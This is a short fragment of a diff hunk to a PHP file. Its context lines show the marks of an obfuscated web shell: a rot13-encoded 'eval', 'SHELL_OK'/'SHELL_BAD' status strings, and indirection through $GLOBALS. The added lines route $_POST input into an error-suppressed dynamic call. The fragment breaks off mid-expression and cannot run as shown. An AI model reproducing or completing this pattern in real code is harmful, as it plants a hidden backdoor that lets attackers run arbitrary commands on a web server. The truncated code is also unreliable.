@@ -32,3 +32,5 @@ str_rot13('riny(
 "SHELL_OK" : "SHELL_BAD";
 ]]);}exit();} ?><?php
 foreach ($GLOBALS[$GLOBALS['
+ = $_POST; @($
+ 
